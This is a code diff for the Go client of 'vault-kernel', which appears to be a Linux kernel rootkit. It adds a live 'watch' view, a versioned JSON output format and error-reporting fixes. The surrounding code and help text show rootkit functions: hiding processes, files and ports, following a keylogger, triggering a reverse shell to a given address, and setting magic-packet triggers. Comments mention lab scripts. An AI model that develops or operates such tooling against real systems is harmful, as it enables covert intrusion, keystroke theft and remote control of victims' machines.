@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"os/signal"
 	"strconv"
 	"strings"
 	"time"
@@ -13,7 +14,7 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.6"
+const clientVersion = "3.7"
 
 const devicePath = "/dev/vault_kernel"
 
@@ -176,16 +177,15 @@ func listHidden(f *os.File) error {
 }
 
 // listHiddenJSON emits the LIST_HIDDEN report as JSON for lab scripts:
-// {"pids": [...], "files": [...], "ports": [...]}.  Empty sections
-// marshal as [] (the parser returns non-nil slices).
+// {"schema": 1, "pids": [...], "files": [...], "ports": [...]}.  Empty
+// sections marshal as [] (the parser returns non-nil slices).
 func listHiddenJSON(f *os.File) error {
 	buf := make([]byte, 4096)
 	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0])); err != 0 {
 		return err
 	}
 	output := strings.TrimRight(string(buf), "\x00")
-	hl := ioctl.ParseHiddenList(output)
-	j, err := json.MarshalIndent(hl, "", "  ")
+	j, err := marshalHiddenJSON(ioctl.ParseHiddenList(output))
 	if err != nil {
 		return err
 	}
@@ -231,6 +231,48 @@ func keylogFollow(f *os.File, intervalMs int) error {
 			prev = cur
 		}
 		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
+	}
+}
+
+// runWatch drives the `watch` command: clear the screen and repaint
+// stats + hidden list every intervalMs until Ctrl-C. Rendering itself
+// lives in ioctl.RenderWatchPanel (pure, unit-tested); this function
+// only owns the refresh loop and console cursor restoration.
+func runWatch(f *os.File, intervalMs int) error {
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt)
+	defer signal.Stop(sig)
+
+	// Hide the cursor for the repaint loop; ALWAYS restore it on exit.
+	fmt.Print("\x1b[?25l")
+	defer fmt.Print("\x1b[?25h")
+
+	statsBuf := make([]byte, 4096)
+	listBuf := make([]byte, 4096)
+	for {
+		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0]))
+		if err != 0 {
+			return err
+		}
+		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&listBuf[0])); err != 0 {
+			return err
+		}
+		panel := ioctl.RenderWatchPanel(
+			ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00")),
+			ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
+			intervalMs,
+			time.Now().Format("15:04:05"),
+		)
+		// ANSI: clear screen + home cursor, then the frame.
+		fmt.Print("\x1b[2J\x1b[H")
+		fmt.Print(panel)
+
+		select {
+		case <-sig:
+			fmt.Println("[*] watch stopped")
+			return nil
+		case <-time.After(time.Duration(intervalMs) * time.Millisecond):
+		}
 	}
 }
 
@@ -331,7 +373,27 @@ func showStatsJSON(f *os.File) error {
 	if len(raw) == 0 {
 		return fmt.Errorf("module returned an empty stats report")
 	}
-	out := make(map[string]interface{}, len(raw))
+	j, err := marshalStatsJSON(raw)
+	if err != nil {
+		return err
+	}
+	fmt.Println(string(j))
+	return nil
+}
+
+// jsonSchemaVersion is the version of the machine-readable output
+// envelope shared by `stats --json`, `list --json` and `doctor --json`
+// in BOTH clients (Go and Python). Bump it whenever a field changes
+// meaning or shape; additive fields keep it at 1 (v3.7 added it).
+const jsonSchemaVersion = 1
+
+// marshalStatsJSON converts a parsed GET_STATS report into the versioned
+// JSON envelope. Numeric values become JSON numbers, the rest stay
+// strings. Extracted from showStatsJSON as a pure function so the
+// envelope is unit-testable without a device.
+func marshalStatsJSON(raw map[string]string) ([]byte, error) {
+	out := make(map[string]interface{}, len(raw)+1)
+	out["schema"] = jsonSchemaVersion
 	for k, v := range raw {
 		if n, err := strconv.Atoi(v); err == nil {
 			out[k] = n
@@ -339,12 +401,21 @@ func showStatsJSON(f *os.File) error {
 			out[k] = v
 		}
 	}
-	j, err := json.MarshalIndent(out, "", "  ")
-	if err != nil {
-		return err
-	}
-	fmt.Println(string(j))
-	return nil
+	return json.MarshalIndent(out, "", "  ")
+}
+
+// hiddenJSONEnvelope wraps the parsed hidden list with the schema
+// marker; the embedded struct keeps the documented key order
+// (schema, pids, files, ports).
+type hiddenJSONEnvelope struct {
+	Schema int `json:"schema"`
+	ioctl.HiddenList
+}
+
+// marshalHiddenJSON renders the parsed LIST_HIDDEN report into the
+// versioned JSON envelope (pure; unit-testable without a device).
+func marshalHiddenJSON(hl ioctl.HiddenList) ([]byte, error) {
+	return json.MarshalIndent(hiddenJSONEnvelope{Schema: jsonSchemaVersion, HiddenList: hl}, "", "  ")
 }
 
 func magicEncode(word string, port uint16) error {
@@ -366,10 +437,11 @@ func magicEncode(word string, port uint16) error {
 // fields are omitted from the JSON when the corresponding check could
 // not run (module unreachable, version not reported, ...).
 type doctorReport struct {
+	Schema         int    `json:"schema"`
 	ClientVersion  string `json:"client_version"`
 	DevicePresent  bool   `json:"device_present"`
-	DeviceOpen     bool   `json:"device_open,omitempty"`
-	StatsResponds  bool   `json:"stats_responds,omitempty"`
+	DeviceOpen     *bool  `json:"device_open,omitempty"`
+	StatsResponds  *bool  `json:"stats_responds,omitempty"`
 	ModuleVersion  string `json:"module_version,omitempty"`
 	VersionMatch   *bool  `json:"version_match,omitempty"`
 	UptimeS        *int64 `json:"uptime_s,omitempty"`
@@ -397,7 +469,7 @@ func renderDoctorJSON(rep *doctorReport) {
 // With jsonMode it prints a single JSON document instead of text, so
 // lab scripts can consume it with jq.
 func runDoctor(jsonMode bool) error {
-	rep := doctorReport{ClientVersion: clientVersion}
+	rep := doctorReport{Schema: jsonSchemaVersion, ClientVersion: clientVersion}
 	say := func(format string, a ...interface{}) {
 		if !jsonMode {
 			fmt.Printf(format, a...)
@@ -429,22 +501,33 @@ func runDoctor(jsonMode bool) error {
 	// 2. Device opens read/write?
 	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
 	if err != nil {
+		// v3.7 parity fix: emit the key as false like the Python
+		// client does — DeviceOpen used to be a plain bool with
+		// omitempty, so the key VANISHED from the JSON exactly when
+		// the check failed.
+		openOK := false
+		rep.DeviceOpen = &openOK
 		say("  [FAIL] cannot open %s: %v\n", devicePath, err)
 		say("         EACCES/EPERM → run with sudo (module also rejects non-root since v3.4).\n")
 		return fail(err)
 	}
 	defer f.Close()
-	rep.DeviceOpen = true
+	openOK := true
+	rep.DeviceOpen = &openOK
 	say("  [ OK ] device opens read/write\n")
 
 	// 3. GET_STATS responds?
 	buf := make([]byte, 4096)
 	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
+		// v3.7 parity fix: same key-vanishing problem as DeviceOpen.
+		statsOK := false
+		rep.StatsResponds = &statsOK
 		say("  [FAIL] GET_STATS failed: %v\n", err)
 		say("         If this is ENOTTY, the client and module versions are out of sync.\n")
 		return fail(err)
 	}
-	rep.StatsResponds = true
+	statsOK := true
+	rep.StatsResponds = &statsOK
 	/* The stats report carries MULTIPLE key=value pairs per line —
 	 * parse it with the shared token-based parser (see
 	 * internal/vaultkernel/report.go for the v3.4/v3.5 bug this
@@ -566,6 +649,7 @@ Commands:
   list [--json]           List all hidden items
   stats                   Show module stats (version, hooks, counts)
   stats --json            Same, as machine-readable JSON
+  watch [--interval MS]   Live view of stats + hidden list (default 1000 ms)
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
@@ -698,6 +782,20 @@ func run() error {
 			return showStatsJSON(f)
 		}
 		return showStats(f)
+
+	case "watch":
+		interval := 1000
+		if len(os.Args) > 2 {
+			if os.Args[2] != "--interval" || len(os.Args) < 4 {
+				return fmt.Errorf("usage: vault_kernel watch [--interval MS]")
+			}
+			n, err := strconv.Atoi(os.Args[3])
+			if err != nil || n < 50 {
+				return fmt.Errorf("invalid interval: %s (milliseconds, min 50)", os.Args[3])
+			}
+			interval = n
+		}
+		return runWatch(f, interval)
 
 	case "shell":
 		if len(os.Args) < 3 {
